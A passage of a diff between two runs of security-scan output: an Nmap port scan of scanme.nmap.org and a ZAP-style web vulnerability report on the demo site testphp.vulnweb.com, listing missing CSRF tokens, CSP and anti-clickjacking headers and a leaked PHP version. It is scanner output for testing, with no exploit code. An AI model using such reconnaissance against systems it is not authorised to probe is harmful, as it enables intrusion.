156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389"/>
 <verbose level="0"/>
 <debugging level="0"/>
@@ -2661,7 +2661,7 @@
 <hostname name="scanme.nmap.org" type="user"/>
 </hostnames>
 </hosthint>
-<host starttime="1729471741" endtime="1729471746"><status state="up" reason="echo-reply" reason_ttl="33"/>
+<host starttime="1729499437" endtime="1729499443"><status state="up" reason="echo-reply" reason_ttl="33"/>
 <address addr="45.33.32.156" addrtype="ipv4"/>
 <hostnames>
 <hostname name="scanme.nmap.org" type="user"/>
@@ -2670,15 +2670,15 @@
 <ports><extraports state="closed" count="995">
 <extrareasons reason="reset" count="995" proto="tcp" ports="1,3-4,6-7,9,13,17,19-21,23-24,26,30,32-33,37,42-43,49,53,70,79,81-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3006,3011,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5985-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389"/>
 </extraports>
-<port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="32"/><service name="ssh" method="table" conf="3"/></port>
+<port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="33"/><service name="ssh" method="table" conf="3"/></port>
 <port protocol="tcp" portid="25"><state state="filtered" reason="no-response" reason_ttl="0"/><service name="smtp" method="table" conf="3"/></port>
-<port protocol="tcp" portid="80"><state state="open" reason="syn-ack" reason_ttl="32"/><service name="http" method="table" conf="3"/></port>
+<port protocol="tcp" portid="80"><state state="open" reason="syn-ack" reason_ttl="33"/><service name="http" method="table" conf="3"/></port>
 <port protocol="tcp" portid="9929"><state state="open" reason="syn-ack" reason_ttl="33"/><service name="nping-echo" method="table" conf="3"/></port>
 <port protocol="tcp" portid="31337"><state state="open" reason="syn-ack" reason_ttl="33"/><service name="Elite" method="table" conf="3"/></port>
 </ports>
-<times srtt="189386" rttvar="1906" to="197010"/>
+<times srtt="188779" rttvar="375" to="190279"/>
 </host>
-<runstats><finished time="1729471746" timestr="Mon Oct 21 03:49:06 2024" summary="Nmap done at Mon Oct 21 03:49:06 2024; 1 IP address (1 host up) scanned in 4.64 seconds" elapsed="4.64" exit="success"/><hosts up="1" down="0" total="1"/>
+<runstats><finished time="1729499443" timestr="Mon Oct 21 11:30:43 2024" summary="Nmap done at Mon Oct 21 11:30:43 2024; 1 IP address (1 host up) scanned in 6.75 seconds" elapsed="6.75" exit="success"/><hosts up="1" down="0" total="1"/>
 </runstats>
 </nmaprun>
 
@@ -2689,1766 +2689,1675 @@
 
 Site: http://testphp.vulnweb.com
 
-  Alert: Absence of Anti-CSRF Tokens, Risk: Medium (Low)
-  Description: <p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</p><p></p><p>CSRF attacks are effective in a number of situations, including:</p><p>    * The victim has an active session on the target site.</p><p>    * The victim is authenticated via HTTP auth on the target site.</p><p>    * The victim is on the same local network as the target site.</p><p></p><p>CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</p>
-
+Alert: Absence of Anti-CSRF Tokens, Risk: Medium (Low), Confidence: 1
+Description: <p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</p><p></p><p>CSRF attacks are effective in a number of situations, including:</p><p>    * The victim has an active session on the target site.</p><p>    * The victim is authenticated via HTTP auth on the target site.</p><p>    * The victim is on the same local network as the target site.</p><p></p><p>CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: POST
-    Evidence: <form action="search.php?test=query" method="post">
-    Other Info: No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "goButton" "searchFor" ].
+
+  Method: POST
+  Evidence: <form action="search.php?test=query" method="post">
+  Other Info: No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "goButton" "searchFor" ].
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: <form action="" method="post" name="faddentry">
-    Other Info: No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "name" "submit" ].
+
+  Method: POST
+  Evidence: <form action="" method="post" name="faddentry">
+  Other Info: No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "name" "submit" ].
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: <form action="search.php?test=query" method="post">
-    Other Info: No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 2: "goButton" "searchFor" ].
+
+  Method: POST
+  Evidence: <form action="search.php?test=query" method="post">
+  Other Info: No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 2: "goButton" "searchFor" ].
 
   URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: <form action="search.php?test=query" method="post">
-    Other Info: No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "goButton" "searchFor" ].
 
-  Alert: Content Security Policy (CSP) Header Not Set, Risk: Medium (High)
-  Description: <p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page � covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>
+  Method: POST
+  Evidence: <form action="search.php?test=query" method="post">
+  Other Info: No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token] was found in the following HTML form: [Form 1: "goButton" "searchFor" ].
 
+Alert: Content Security Policy (CSP) Header Not Set, Risk: Medium (High), Confidence: 3
+Description: <p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page � covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/AJAX/index.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/artists.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/artists.php?artist=1
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/artists.php?artist=2
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/artists.php?artist=3
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/categories.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/disclaimer.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/high
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/hpp/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/hpp/?pp=12
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/index.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=1
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=2
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=3
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=1
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=2
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=3
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=4
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/login.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/privacy.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=1
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=2
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=3
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=4
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=5
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=6
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/product.php?pic=7
-    Method: GET
-    Evidence: 
-    Other Info: 
 
-  URI: http://testphp.vulnweb.com/robots.txt
-    Method: GET
-    Evidence: 
-    Other Info: 
+  Method: GET
 
   URI: http://testphp.vulnweb.com/signup.php
-    Method: GET
-    Evidence: 
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: POST
-    Evidence: 
-    Other Info: 
+
+  Method: POST
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: 
-    Other Info: 
+
+  Method: POST
 
   URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: 
-    Other Info: 
+
+  Method: POST
 
   URI: http://testphp.vulnweb.com/secured/newuser.php
-    Method: POST
-    Evidence: 
-    Other Info: 
 
-  Alert: Missing Anti-clickjacking Header, Risk: Medium (Medium)
-  Description: <p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>
+  Method: POST
 
-Instances:
-
-  URI: http://testphp.vulnweb.com/AJAX/index.php
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/artists.php
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/artists.php?artist=1
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/artists.php?artist=2
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/artists.php?artist=3
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/cart.php
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/categories.php
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/disclaimer.php
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/hpp/
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/hpp/?pp=12
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/index.php
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/listproducts.php?artist=1
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/listproducts.php?artist=2
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/listproducts.php?artist=3
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/listproducts.php?cat=1
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/listproducts.php?cat=2
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/listproducts.php?cat=3
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/listproducts.php?cat=4
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/product.php?pic=1
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/product.php?pic=2
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/product.php?pic=3
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/product.php?pic=4
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/product.php?pic=5
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/product.php?pic=6
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/product.php?pic=7
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/signup.php
-    Method: GET
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/cart.php
-    Method: POST
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: 
-    Other Info: 
-
-  URI: http://testphp.vulnweb.com/secured/newuser.php
-    Method: POST
-    Evidence: 
-    Other Info: 
-
-  Alert: Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s), Risk: Low (Medium)
-  Description: <p>The web/application server is leaking information via one or more "X-Powered-By" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.</p>
-
+Alert: Missing Anti-clickjacking Header, Risk: Medium (Medium), Confidence: 2
+Description: <p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/AJAX/index.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
 
-  URI: http://testphp.vulnweb.com/artists.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+  Method: GET
 
   URI: http://testphp.vulnweb.com/artists.php?artist=1
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/artists.php?artist=2
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/artists.php?artist=3
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/categories.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
 
-  URI: http://testphp.vulnweb.com/disclaimer.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+  Method: GET
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/hpp/
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/hpp/?pp=12
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/index.php
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=1
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=2
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
-    Other Info: 
+
+  Method: GET
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=3
-    Method: GET
-    Evidence: X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
